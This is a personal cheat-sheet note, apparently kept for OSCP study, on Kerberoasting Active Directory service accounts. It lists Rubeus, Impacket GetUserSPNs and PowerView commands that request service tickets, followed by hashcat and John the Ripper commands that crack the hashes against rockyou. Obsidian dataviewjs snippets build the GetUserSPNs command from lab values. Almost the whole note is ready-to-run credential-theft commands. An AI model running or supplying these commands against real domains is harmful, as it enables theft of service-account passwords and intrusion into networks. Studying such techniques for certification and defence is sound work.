#kerberoasting #active-directory 

Tools: `Rubeus`, `Impacket`, `PowerView`, `GetUserSPNs.py`
## Rubeus
Kerberoast from local machine `.\Rubeus.exe kerberoast /outfile:hashes.kerberoast`
Check what mode Hashcat needs to be in `hashcat --help | grep -i "Kerberos"`
Crack the retrieved hash `sudo hashcat -m 13100 hashes.kerberoast /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force`
## Impacket GetUsersSPNs (Kerberoasting)
Retrieve Kerberoastable accounts `sudo impacket-GetUserSPNs -request -dc-ip 192.168.50.70 corp.com/pete` -> `sudo hashcat -m 13100 hashes.kerberoast2 /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force`
### 🔎 Step-by-Step Guide

## Service Accounts : Requires SVC accounts and creds of a standard user

Whenever getting access to domain credentials it is important to test a few of the tools from `impacket`. In this case we will use `GetUserSPNs.py` to extract encrypted passwords of any kerberoastable service accounts.

User:: svc_apache
```dataviewjs
const page = dv.page("Synced OSCP Notes/Top/Active Machine"); const ip = page?.IP ?? "NO IP FOUND"; const discoveredDomain = page?.["Discovered Web Domain"] ?? "NO DOMAIN FOUND"; const pagea = dv.page("Synced OSCP Notes/Small Toolkit/Active Directory Toolkit"); const user = pagea?.["User"] ?? "NO USER FOUND";
```
```dataviewjs
const page = dv.page("Synced OSCP Notes/Top/Active Machine"); const ip = page?.IP ?? "NO IP FOUND"; const discoveredDomain = page?.["Discovered Web Domain"] ?? "NO DOMAIN FOUND"; const pagea = dv.page("Synced OSCP Notes/Small Toolkit/Active Directory Toolkit"); const user = pagea?.["User"] ?? "NO USER FOUND"; // Fixed: changed page? to pagea? const command = `impacket-GetUserSPNs -request -dc-ip ${ip} ${discoveredDomain}/${user}`; dv.paragraph("```bash\n" + command + "\n```");
```
```dataviewjs
const page = dv.page("Synced OSCP Notes/Top/Active Machine");
const ip = page?.IP ?? "NO IP FOUND";
const discoveredDomain = page?.["Discovered Web Domain"] ?? "NO DOMAIN FOUND";

const pagea = dv.page("Synced OSCP Notes/Small Toolkit/Active Directory Toolkit");
const user = pagea?.["User"] ?? "NO USER FOUND"; // Fixed: changed page? to pagea?

const command = `impacket-GetUserSPNs -request -dc-ip ${ip} ${discoveredDomain}/${user}`;

dv.paragraph("```bash\n" + command + "\n```");

```

```
john -w=/usr/share/wordlists/rockyou.txt hash.txt
```


#### 1. 🖥️ Enumerate SPNs (Windows - PowerView)
```
# Load PowerView
Import-Module .\PowerView.ps1

# Find accounts with SPNs
Get-DomainUser -SPN
```
#### 🎟️ 2. Request TGS for SPNs
```
# Using Rubeus
Rubeus.exe kerberoast

# Or manually with Impacket
python3 GetUserSPNs.py domain/user:password -dc-ip x.x.x.x
```
#### 4. 🔓 Crack the Hashes (Offline)
```
# Using Hashcat
hashcat -m 13100 kerberoast_hashes.txt wordlist.txt

# Using John the Ripper
john --wordlist=wordlist.txt kerberoast_hashes.txt
```


